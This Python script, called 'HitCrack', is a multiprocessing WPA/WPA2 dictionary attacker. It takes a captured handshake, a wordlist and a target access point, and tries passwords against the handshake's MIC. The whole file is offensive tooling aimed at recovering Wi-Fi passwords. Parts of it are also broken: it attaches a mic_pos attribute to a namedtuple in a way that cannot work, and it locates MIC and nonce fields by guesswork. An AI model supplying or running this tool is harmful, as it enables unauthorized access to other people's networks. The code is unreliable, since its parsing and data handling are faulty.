import argparse
import multiprocessing as mp
import time
import os
import sys
import hashlib
import hmac
import binascii
from collections import namedtuple

# Try to import scapy; if not present, we will still provide the multiprocessing wrapper,
# but handshake parsing will fail and you'll need to provide --ssid, --ap, --client, --anonce, --snonce, --eapol-file etc.
try:
    from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon, Dot11Elt
except Exception:
    rdpcap = None
    EAPOL = None
    Dot11 = None
    Dot11Beacon = None
    Dot11Elt = None

Handshake = namedtuple("Handshake", ["ssid", "ap_mac", "client_mac", "anonce", "snonce", "eapol_frame", "mic"])

def hexdump(b: bytes) -> str:
    return binascii.hexlify(b).decode()

def pbkdf2(passphrase: str, ssid: str) -> bytes:
    """PBKDF2-HMAC-SHA1 to derive PMK (32 bytes)."""
    return hashlib.pbkdf2_hmac('sha1', passphrase.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)

def custom_prf512(pmk: bytes, A: bytes, B: bytes) -> bytes:
    """
    Expand PMK to PTK (512 bits) via the WPA PRF as commonly implemented:
    PTK = PRF-512(PMK, "Pairwise key expansion", B)
    """
    blen = 64
    i = 0
    R = b''
    while len(R) < blen:
        hmacsha1 = hmac.new(pmk, A + b'\x00' + B + bytes([i]), hashlib.sha1)
        R += hmacsha1.digest()
        i += 1
    return R[:blen]

def compute_ptk(pmk: bytes, ap_mac: bytes, client_mac: bytes, anonce: bytes, snonce: bytes) -> bytes:
    """
    Construct B and call custom_prf512 to obtain PTK.
    B = min(AP, STA) || max(AP, STA) || min(ANonce, SNonce) || max(ANonce, SNonce)
    """
    A = b"Pairwise key expansion"
    if ap_mac < client_mac:
        macs = ap_mac + client_mac
    else:
        macs = client_mac + ap_mac
    if anonce < snonce:
        nonces = anonce + snonce
    else:
        nonces = snonce + anonce
    B = macs + nonces
    return custom_prf512(pmk, A, B)

def zero_mic(eapol: bytes, mic_pos: int) -> bytes:
    return eapol[:mic_pos] + b'\x00' * 16 + eapol[mic_pos + 16:]

def calc_mic(kck: bytes, eapol: bytes) -> bytes:
    # For WPA2 (CCMP), MIC is HMAC-SHA1 truncated to 16 bytes
    mic = hmac.new(kck, eapol, hashlib.sha1).digest()[:16]
    return mic

def try_password(password: str, handshake: Handshake) -> bool:
    """
    Given a candidate password and a parsed handshake, derive PMK/PTK and verify MIC.
    Returns True if password is correct.
    """
    pmk = pbkdf2(password, handshake.ssid)
    ptk = compute_ptk(pmk, binascii.unhexlify(handshake.ap_mac.replace(':', '')), binascii.unhexlify(handshake.client_mac.replace(':', '')), handshake.anonce, handshake.snonce)
    kck = ptk[0:16]
    # eapol frame used to compute MIC must have the MIC bytes zeroed
    eapol_zeroed = zero_mic(handshake.eapol_frame, handshake.mic_pos)
    mic = calc_mic(kck, eapol_zeroed)
    return mic == handshake.mic

def parse_handshake_from_cap(cap_path: str, target_bssid: str = None) -> Handshake:
    """
    Best-effort parse handshake from pcap using scapy.
    Returns a Handshake namedtuple or raises ValueError on failure.
    """
    if rdpcap is None:
        raise RuntimeError("scapy not available. Install scapy or provide handshake fields manually.")

    pkts = rdpcap(cap_path)

    # Find SSID from Beacon frames for target_bssid if possible
    ssid = None
    ap_mac = None
    if target_bssid:
        target_bssid = target_bssid.lower()
    for p in pkts:
        if p.haslayer(Dot11Beacon) and p.haslayer(Dot11Elt):
            addr = p.addr2
            if addr and (target_bssid is None or addr.lower() == target_bssid):
                # find SSID element
                ss = None
                for elt in p[Dot11Elt]:
                    if elt.ID == 0:
                        ss = elt.info.decode(errors='ignore')
                        break
                if ss:
                    ssid = ss
                    ap_mac = addr.lower()
                    break

    # Find EAPOL key frames (4-way handshake)
    eapol_frames = []
    for p in pkts:
        if p.haslayer(EAPOL):
            # 802.11 addresses
            addr1 = getattr(p, 'addr1', None)
            addr2 = getattr(p, 'addr2', None)
            addr3 = getattr(p, 'addr3', None)
            # prefer frames that match target_bssid
            eapol_frames.append((p, addr1, addr2, addr3))

    if not eapol_frames:
        raise ValueError("No EAPOL frames found in capture.")

    # Heuristic: find pair of frames between AP and STA where one contains ANonce and the other SNonce+MIC
    ap = None
    client = None
    m1 = None
    m2 = None
    # Inspect raw bytes to locate 'nonce' fields
    for p, a1, a2, a3 in eapol_frames:
        # Identify AP address guess: if Dot11 addr2 appears often as same MAC in beacons above
        pass

    # Simpler heuristic:
    # Find two EAPOL frames with same src/dst reversed and one has non-zero MIC field (likely M2 or M4).
    candidates = []
    for p, a1, a2, a3 in eapol_frames:
        src = a2.lower() if a2 else None
        dst = a1.lower() if a1 else None
        candidates.append((p, src, dst))

    # Try to find M1 (from AP -> STA) containing ANonce and M2 (STA->AP) containing SNonce + MIC
    m1_pkt = None
    m2_pkt = None
    for p1, src1, dst1 in candidates:
        for p2, src2, dst2 in candidates:
            if src1 == dst2 and dst1 == src2 and src1 != src2:
                # p1 and p2 are between same AP and STA
                # Prefer p1 from AP (match target_bssid if provided)
                if target_bssid:
                    if src1 != target_bssid and src2 != target_bssid:
                        continue
                # Determine which has a MIC (non-zero) by inspecting raw EAPOL bytes
                raw1 = bytes(p1[EAPOL])
                raw2 = bytes(p2[EAPOL])
                # Search for 16-byte MIC: look for a 16-byte region that is not all zeros near typical MIC offset.
                # We'll attempt to find 16 non-zero bytes anywhere in the eapol payload as a heuristic.
                def has_nonzero_mic(raw):
                    return any(b != 0 for b in raw)
                # Cheap heuristic: one of frames typically has a MIC inside its payload - we locate it by searching for 16 consecutive bytes that look like a MIC.
                def find_mic(raw):
                    # try typical offsets first (WPA handshake layout): MIC often appears around byte 81 of EAPOL payload
                    typical_offsets = [81, 77, 100, 53, 55]
                    for off in typical_offsets:
                        if off + 16 <= len(raw):
                            block = raw[off:off+16]
                            if any(b != 0 for b in block):
                                return off, block
                    # fallback search any 16-byte region with at least one non-zero byte
                    for off in range(0, max(0, len(raw) - 15)):
                        block = raw[off:off+16]
                        if any(b != 0 for b in block):
                            return off, block
                    return None, None
                off1, mic1 = find_mic(raw1)
                off2, mic2 = find_mic(raw2)
                # If one frame has a MIC and the other likely has ANonce/SNonce
                if mic1 and not mic2:
                    m2_pkt, m1_pkt = p1, p2  # p1 contains MIC -> M2-like, p2 contains nonce -> M1-like
                elif mic2 and not mic1:
                    m2_pkt, m1_pkt = p2, p1
                elif mic1 and mic2:
                    # both have some non-zero area — choose one pair arbitrarily with target_bssid preference
                    m2_pkt, m1_pkt = p1, p2
                if m1_pkt and m2_pkt:
                    break
        if m1_pkt and m2_pkt:
            break

    if not m1_pkt or not m2_pkt:
        # As a fallback, pick first two EAPOL frames and hope
        m1_pkt = candidates[0][0]
        m2_pkt = candidates[1][0] if len(candidates) > 1 else candidates[0][0]

    # Extract AP/Client MACs
    ap_mac = getattr(m1_pkt, 'addr2', None) or getattr(m1_pkt, 'addr1', None)
    client_mac = getattr(m2_pkt, 'addr2', None) or getattr(m2_pkt, 'addr1', None)
    if not ap_mac or not client_mac:
        raise ValueError("Could not determine AP/Client MACs from handshake frames.")

    # Extract ANonce and SNonce: they are present in the Key Nonce field of the EAPOL Key frame.
    # Offsets depend on the implementation; commonly ANonce starts around byte 13 of key descriptor (skip EAPOL header).
    def extract_nonce(pkt):
        raw = bytes(pkt[EAPOL])
        # try common positions for the Nonce (key nonce) — common offset: 13 (after EAPOL header + key descriptor)
        # We'll attempt a few offsets.
        possible_offsets = [13, 17, 21, 25, 29]
        for off in possible_offsets:
            if off + 32 <= len(raw):
                candidate = raw[off:off+32]
                # Heuristic: nonce should not be all zeros
                if any(b != 0 for b in candidate):
                    return candidate
        # fallback: search for 32-byte region not all zeros
        for off in range(0, max(0, len(raw) - 31)):
            candidate = raw[off:off+32]
            if any(b != 0 for b in candidate):
                return candidate
        return None

    anonce = extract_nonce(m1_pkt)
    snonce = extract_nonce(m2_pkt)
    if anonce is None or snonce is None:
        raise ValueError("Could not extract ANonce/SNonce from handshake frames.")

    # Locate MIC and its position in the EAPOL frame chosen for verification (the one that contains MIC)
    # We'll use the packet we identified as containing the MIC (m2_pkt).
    raw_eapol_with_mic = bytes(m2_pkt[EAPOL])
    # Find position of 16-byte MIC inside this eapol payload by searching for 16-byte region likely to be MIC.
    mic_pos = None
    mic_value = None
    # Try typical offsets first
    typical_offsets = [81, 77, 100, 53, 55]
    for off in typical_offsets:
        if off + 16 <= len(raw_eapol_with_mic):
            block = raw_eapol_with_mic[off:off+16]
            if any(b != 0 for b in block):
                mic_pos = off
                mic_value = block
                break
    if mic_pos is None:
        # fallback: first 16-byte region that is not all zeros
        for off in range(0, max(0, len(raw_eapol_with_mic) - 15)):
            block = raw_eapol_with_mic[off:off+16]
            if any(b != 0 for b in block):
                mic_pos = off
                mic_value = block
                break
    if mic_pos is None:
        raise ValueError("Could not locate MIC in EAPOL frame.")

    # Determine ssid if not found earlier: try to get Beacon with ap_mac
    if ssid is None:
        for p in pkts:
            if p.haslayer(Dot11Beacon) and p.addr2 and p.addr2.lower() == ap_mac.lower():
                for elt in p[Dot11Elt]:
                    if elt.ID == 0:
                        ssid = elt.info.decode(errors='ignore')
                        break
                if ssid:
                    break

    if ssid is None:
        raise ValueError("SSID not found in capture; please supply --ssid on the CLI.")

    # Normalize MACs to hex bytes without separators for compute_ptk which expects raw bytes
    ap_mac_nocolon = ap_mac.replace(':', '').lower()
    client_mac_nocolon = client_mac.replace(':', '').lower()

    handshake = Handshake(
        ssid=ssid,
        ap_mac=ap_mac_nocolon,
        client_mac=client_mac_nocolon,
        anonce=anonce,
        snonce=snonce,
        eapol_frame=raw_eapol_with_mic,
        mic=mic_value,
    )
    # Attach mic_pos for zeroing when computing MIC
    # We'll store mic_pos on the namedtuple (monkey patch)
    handshake = handshake._replace()
    # monkey patch: attach mic_pos as attribute
    object.__setattr__(handshake, 'mic_pos', mic_pos)
    return handshake

def worker_task(start_idx: int, step: int, wordlist_path: str, handshake: Handshake, ctrl_conn):
    """
    Worker process: reads wordlist and processes every Nth word starting from start_idx.
    Reports back via ctrl_conn: ('progress', count) or ('found', password) or ('done', count)
    """
    tested = 0
    try:
        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for i, line in enumerate(f):
                if (i % step) != start_idx:
                    continue
                password = line.strip()
                if not password:
                    continue
                tested += 1
                if try_password(password, handshake):
                    ctrl_conn.send(('found', password))
                    return
                # Periodically report progress (we send every line here; receiver can aggregate)
                if tested % 10 == 0:
                    ctrl_conn.send(('progress', tested))
        ctrl_conn.send(('done', tested))
    except Exception as e:
        ctrl_conn.send(('error', str(e)))

def monitor_processes(procs, parent_conns, total_candidates):
    """
    Monitor child processes, aggregate progress, stop all when a password is found.
    """
    start_time = time.time()
    total_tested = 0
    found = None
    alive = True
    try:
        while alive:
            alive = False
            for conn in parent_conns:
                while conn.poll():
                    msg = conn.recv()
                    typ = msg[0]
                    if typ == 'progress':
                        total_tested += msg[1]
                    elif typ == 'found':
                        found = msg[1]
                        # signal all children to stop by terminating processes
                        for p in procs:
                            if p.is_alive():
                                p.terminate()
                        break
                    elif typ == 'done':
                        total_tested += msg[1]
                    elif typ == 'error':
                        print("Worker error:", msg[1], file=sys.stderr)
                if found:
                    break
            if found:
                break
            alive = any(p.is_alive() for p in procs)
            elapsed = time.time() - start_time
            kps = total_tested / max(elapsed, 1.0)
            print(f"\rTested: {total_tested}    KPS: {kps:.2f}    ", end='', flush=True)
            time.sleep(0.5)
        print()  # newline
        return found, total_tested
    finally:
        # Ensure processes are cleaned up
        for p in procs:
            if p.is_alive():
                p.terminate()
                p.join(timeout=0.1)

def count_lines(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            for i, _ in enumerate(f, 1):
                pass
        return i
    except Exception:
        return None

def main():
    art = r"""
 /$$       /$$   /$$                                          /$$      
| $$      |__/  | $$                                          \ $$      
| $$$$$$$ /$$ /$$$$$$   /$$$$$$$  /$$$$$$  /$$$$$$    /$$$$$$$ \ $$   /$$
| $$__  $$| $$|_  $$_/  /$$_____/ /$$__  $$|____  $$  /$$_____/ \ $$  /$$/
| $$  \ $$| $$  | $$   | $$      | $$  \__/ /$$$$$$$|  $$        \ $$$$$$/ 
| $$  | $$| $$  | $$ /$$| $$      | $$      /$$__  $$ | $$__      \ $$_  $$ 
| $$  | $$| $$  |  $$$$/|  $$$$$$$| $$     |  $$$$$$$ |  $$$$$$$   \ $$ \  $$
|__/  |__/|__/   \___/   \_______/|__/      \_______/  \_______/    \__/  \__/
"""
    parser = argparse.ArgumentParser(description="HitCrack — multiprocessing WPA/WPA2 dictionary attacker (starter)")
    parser.add_argument('--cap', '-c', required=True, help="Path to .cap file containing 4-way handshake")
    parser.add_argument('--wordlist', '-w', required=True, help="Path to wordlist file")
    parser.add_argument('--bssid', '-b', required=True, help="Target BSSID (AP MAC) e.g. aa:bb:cc:dd:ee:ff")
    parser.add_argument('--ssid', '-s', help="SSID (if not present in capture)")
    parser.add_argument('--threads', '-t', type=int, default=max(1, mp.cpu_count() - 1), help="Number of worker processes")
    args = parser.parse_args()

    if not os.path.exists(args.cap):
        print("CAP file not found:", args.cap, file=sys.stderr)
        sys.exit(2)
    if not os.path.exists(args.wordlist):
        print("Wordlist not found:", args.wordlist, file=sys.stderr)
        sys.exit(2)

    # Parse handshake
    print("Parsing handshake from capture...")
    try:
        handshake = parse_handshake_from_cap(args.cap, args.bssid)
        # If user provided --ssid, override parsed
        if args.ssid:
            handshake = handshake._replace(ssid=args.ssid)
        print(f"SSID: {handshake.ssid}")
        print(f"AP MAC: {handshake.ap_mac}")
        print(f"Client MAC: {handshake.client_mac}")
        print(f"ANonce: {hexdump(handshake.anonce)}")
        print(f"SNonce: {hexdump(handshake.snonce)}")
        print(f"MIC (captured): {hexdump(handshake.mic)}")
    except Exception as e:
        print("Handshake parsing failed:", str(e), file=sys.stderr)
        print("If parsing fails, ensure the capture contains a full 4-way handshake and that scapy is installed.")
        sys.exit(2)

    total_lines = count_lines(args.wordlist)
    if total_lines:
        print(f"Wordlist size: ~{total_lines} lines")
    else:
        print("Could not determine wordlist size in advance.")

    # Spawn workers
    num_workers = max(1, args.threads)
    manager_conns = []
    procs = []
    for i in range(num_workers):
        parent_conn, child_conn = mp.Pipe()
        p = mp.Process(target=worker_task, args=(i, num_workers, args.wordlist, handshake, child_conn), daemon=True)
        p.start()
        procs.append(p)
        manager_conns.append(parent_conn)

    print(f"Started {num_workers} worker processes. Cracking...")

    found, total_tested = monitor_processes(procs, manager_conns, total_lines or 0)
    if found:
        print(f"Password found: {found}")
    else:
        print("Password not found in provided wordlist.")
    print(f"Total tested: {total_tested}")

if __name__ == "__main__":
    main()